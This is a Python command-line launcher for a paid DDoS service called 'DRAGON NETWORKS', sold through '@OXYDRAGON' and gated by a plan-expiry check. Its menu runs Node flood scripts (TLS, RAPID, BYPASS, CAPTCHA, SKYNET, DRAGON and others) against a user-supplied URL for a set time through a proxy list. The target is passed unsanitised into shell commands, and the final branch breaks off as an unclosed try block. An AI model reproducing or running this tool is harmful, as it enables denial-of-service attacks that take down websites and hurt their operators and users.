# -*- coding: utf-8 -*-
import datetime
expiry_date = datetime.datetime(2024, 7, 30)  # Set your expiry date here

if datetime.datetime.now() > expiry_date:
    print("Sorry, your plan has expired. Buy plan DM @OXYDRAGON")
    exit()
    

from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = "@OXYDRAGON"

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (0, 0, 255)
end_color = (0, 0, 150)
class Color:
    colorama.init()

def help(): 
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
▓⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠓⡌⠲⢡⠒⡀⠂⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⡐⠠⠄⣦⡠⠀⠄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⡌⣏
⣀⣀⣀⣼⣷⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠁⠆⠡⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠈⡐⠠⢁⠲⣿⡇⠡⠈⢀⠐⠨⠐⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠒⡌
⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢀⠸⣿⣷⠀⠈⠠⠈⠁⢊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣇⠀⠀⢠⡖⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⡈⠔
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⡄⠀⢠⣤⣼⣿⣿⡄⣴⣿⡀⠀⠀⠀⠄⠀⠂⠁⠀⠀⠀⠀⠄⠀⠀⠡⢀⠡⠰⣉
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⣰⣿⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣦⣈⢿⣿⣿⣿⣿⣌⠻⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠠⠑⡌
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣤⣻⣿⣿⣿⣿⡄⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⣹⣿⣦⣬⡉⠻⣿⡟⠿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣀⡆⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣶⡌⢻⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣏⣿⣏⠉⠙⣻⣿⣿⣷⣿⣶⣽⣿⣿⣿⣿⣿⣿⢿⣿⡛⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣏⢋⠡⣀⣼⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣝⣻⢷⣌⡻⡄⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡜⣿⣿⣿⣿⢧⣻⣿⣿⡿⣟⣻⢿⣽⣿⣿⣿⣿⣿⣿⣿⡏⣾⣿⣞⡓⠺⣿⣿⣽⣿⣿⣿⣿⡿⣿⣿⣿⠿⢿⡿⣿⣿⣿⣷⣟⣿⣭⣍⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡎⢻⣷⡿⣿⡇⣯⠛⣩⣞⠯⣭⡻⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣽⣿⣆⠀⠴⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡗⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⣼⣻⡿⢋⣩⣿⣟⠧⣍⠹⣲⢿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿⡇⢼⣿⣟⡛⠛⣾⣿⣿⣿⣿⣿⣾⣿⣹⣻⣿⠀⠀⠀⠀⠈⢿⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡽⠝⣉⠴⣋⣀⠀⢦⠽⢷⣝⣮⣻⢻⣿⣮⣿⣿⣿⣿⣿⣿⣿⣇⣾⣿⣿⣟⣻⢿⣿⣷⣿⣿⣿⣿⣿⣹⣯⠙⣣⣀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠂
⡥⠤⢀⣐⣒⣭⢁⡒⢬⠰⣙⡼⣿⡜⢠⠿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣧⡰⠶⠐⡄⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡀⠂⠀⠀⠀⠀⠂⠈⠀⠀
⣤⣤⣄⣉⣑⡪⣽⣻⣄⠹⣽⣷⡿⢁⡞⢈⣻⣿⣿⣿⣿⣿⣿⣟⠂⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣇⠒⠀⠰⡄⠀⢀⡐⢠⠈⠄⠐⠀⣁⠂⠄⠁⠠⠈⠄⠂⠄⠂⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⠇⡼⢀⣠⣼⣿⣿⣿⣿⣿⣿⣿⣆⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡐⠂⠁⠘⣄⠢⡐⢢⠌⣢⠡⢌⠠⢌⠠⡁⢎⡱⡌⢡⠂⠐⡀⠀
⠀⠘⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⠀⣷⣽⣧⣬⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠒⠁⠘⡄⢣⠓⣮⣵⢩⣦⠋⣦⠂⢱⠋⣴⠑⠂⢠⠁⢰⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣾⡻⢿⡇⢸⣵⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣯⣿⣱⡀⣀⠔⢻⣎⡳⣝⣮⣟⢮⣛⠬⡘⠤⣋⠔⠢⠌⡄⡘⠦⣍
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣜⣧⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣈⢿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣸⡁⠀⢀⠔⢯⣟⡽⣺⢭⠳⣍⠶⣡⢳⢌⢊⡑⢌⡐⣉⠖⡬
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠉⠉⠻⣽⣿⣿⢿⠗⠊⠁⢀⢼⣾⣱⢯⣞⡷⣌⠷⣭⢳⣎⠶⣸⣴⣺⣽⣾⣿
⠀⠀⢸⣿⣿⣿⣿⣿⡿⠛⠩⢁⠲⢜⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⣢⣄⠙⣿⣿⢸⣶⠤⠒⠁⣨⡷⣯⣟⡾⣽⣯⣿⣽⣳⣞⣿⣳⣯⣿⣿⣿⣿
⠀⠀⢸⣿⣿⣿⠟⠁⠀⠀⠀⠂⠁⠈⠂⢡⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣦⠠⣿⣸⣷⣠⣤⠞⢹⣿⣳⢯⣿⣻⣽⣾⣷⣿⣿⣽⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣿⠟⠁⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣉⢀⣴⣿⢳⢫⢟⠾⣽⡻⣟⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿		  
                                                                                                                   
                                           
                                     BUY @OXYDRAGON
                                     
                                                                                                                   
                                                                                                                                     
                                                                     
                            DRAGON NETWORKS ---- [ LAYER 7 ]
                          
                 | root@Basic |                          | root@Vip |         
                          
                   • TLS                                   • SKYNET                   
                   • RAPID                                 • BYPASS                                
                   • KILL                                  • DRAGON
                   • CAPTCHA                               • DRAGON-VIP
                   • XMIX                                                   
                                                     
                           
                                 
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""
▓⠀⠀⠀⢠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠓⡌⠲⢡⠒⡀⠂⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⡐⠠⠄⣦⡠⠀⠄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⡌⣏
⣀⣀⣀⣼⣷⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠁⠆⠡⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠈⡐⠠⢁⠲⣿⡇⠡⠈⢀⠐⠨⠐⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠒⡌
⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢀⠸⣿⣷⠀⠈⠠⠈⠁⢊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣇⠀⠀⢠⡖⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⡈⠔
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⡄⠀⢠⣤⣼⣿⣿⡄⣴⣿⡀⠀⠀⠀⠄⠀⠂⠁⠀⠀⠀⠀⠄⠀⠀⠡⢀⠡⠰⣉
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⣰⣿⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣦⣈⢿⣿⣿⣿⣿⣌⠻⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠠⠑⡌
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣤⣻⣿⣿⣿⣿⡄⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠸
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣅⠀⠀⠀⠀⠀⠀⣹⣿⣦⣬⡉⠻⣿⡟⠿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣀⡆⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⣶⡌⢻⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣏⣿⣏⠉⠙⣻⣿⣿⣷⣿⣶⣽⣿⣿⣿⣿⣿⣿⢿⣿⡛⠿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣼⣏⢋⠡⣀⣼⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣝⣻⢷⣌⡻⡄⣠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⡜⣿⣿⣿⣿⢧⣻⣿⣿⡿⣟⣻⢿⣽⣿⣿⣿⣿⣿⣿⣿⡏⣾⣿⣞⡓⠺⣿⣿⣽⣿⣿⣿⣿⡿⣿⣿⣿⠿⢿⡿⣿⣿⣿⣷⣟⣿⣭⣍⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡎⢻⣷⡿⣿⡇⣯⠛⣩⣞⠯⣭⡻⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣽⣿⣆⠀⠴⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡗⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡇⣼⣻⡿⢋⣩⣿⣟⠧⣍⠹⣲⢿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿⡇⢼⣿⣟⡛⠛⣾⣿⣿⣿⣿⣿⣾⣿⣹⣻⣿⠀⠀⠀⠀⠈⢿⣿⣿⣿⠏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡽⠝⣉⠴⣋⣀⠀⢦⠽⢷⣝⣮⣻⢻⣿⣮⣿⣿⣿⣿⣿⣿⣿⣇⣾⣿⣿⣟⣻⢿⣿⣷⣿⣿⣿⣿⣿⣹⣯⠙⣣⣀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠂
⡥⠤⢀⣐⣒⣭⢁⡒⢬⠰⣙⡼⣿⡜⢠⠿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣧⡰⠶⠐⡄⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⡀⠂⠀⠀⠀⠀⠂⠈⠀⠀
⣤⣤⣄⣉⣑⡪⣽⣻⣄⠹⣽⣷⡿⢁⡞⢈⣻⣿⣿⣿⣿⣿⣿⣟⠂⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣇⠒⠀⠰⡄⠀⢀⡐⢠⠈⠄⠐⠀⣁⠂⠄⠁⠠⠈⠄⠂⠄⠂⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⠇⡼⢀⣠⣼⣿⣿⣿⣿⣿⣿⣿⣆⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡐⠂⠁⠘⣄⠢⡐⢢⠌⣢⠡⢌⠠⢌⠠⡁⢎⡱⡌⢡⠂⠐⡀⠀
⠀⠘⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⠀⣷⣽⣧⣬⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠒⠁⠘⡄⢣⠓⣮⣵⢩⣦⠋⣦⠂⢱⠋⣴⠑⠂⢠⠁⢰⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣾⡻⢿⡇⢸⣵⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣯⣿⣱⡀⣀⠔⢻⣎⡳⣝⣮⣟⢮⣛⠬⡘⠤⣋⠔⠢⠌⡄⡘⠦⣍
⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣜⣧⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣈⢿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣸⡁⠀⢀⠔⢯⣟⡽⣺⢭⠳⣍⠶⣡⢳⢌⢊⡑⢌⡐⣉⠖⡬
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠉⠉⠻⣽⣿⣿⢿⠗⠊⠁⢀⢼⣾⣱⢯⣞⡷⣌⠷⣭⢳⣎⠶⣸⣴⣺⣽⣾⣿
⠀⠀⢸⣿⣿⣿⣿⣿⡿⠛⠩⢁⠲⢜⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⣢⣄⠙⣿⣿⢸⣶⠤⠒⠁⣨⡷⣯⣟⡾⣽⣯⣿⣽⣳⣞⣿⣳⣯⣿⣿⣿⣿
⠀⠀⢸⣿⣿⣿⠟⠁⠀⠀⠀⠂⠁⠈⠂⢡⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣦⠠⣿⣸⣷⣠⣤⠞⢹⣿⣳⢯⣿⣻⣽⣾⣷⣿⣿⣽⣿⣿⣿⣿⣿⣿
⠀⠀⣿⣿⠟⠁⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⣰⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣉⢀⣴⣿⢳⢫⢟⠾⣽⡻⣟⣾⣽⣿⣿⣿⣿⣿⣿⣿⣿		  
                                                                                                                   
                                           
                                     BUY @OXYDRAGON
                                     TO START TYPE 'MENU'
                                     \033[0m""")
                                     

	while True:
		sys.stdout.write(f"\x1b]2;[\] DRAGON-NETWORKS :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[31mroot@Networks\x1b[1;31m\:~# \x1b[1;\033[31m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "Method" or sinput == "METHOD" or sinput == ".Method" or sinput == ".METHOD" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "TLS" or sinput == "tls":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node TLS-SILIT {target} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "RAPID" or sinput == "rapid":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node RAPID {target} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node improved-tls {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "CAPTCHA" or sinput == "captcha":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node tls-arz.js {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "SKYNET" or sinput == "skynet":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node gflood {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "BYPASS" or sinput == "bypass":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node BYPASS-SILIT {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "DRAGON" or sinput == "DRAGON":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node DRAGON {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "DRAGON-VIP" or sinput == "dragon-vip":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node DRAGON-VIP {url} {time} 32 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "XMIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd Layer7 && node XMIX.js {url} {time} 32 10 proxy.txt')
				
main()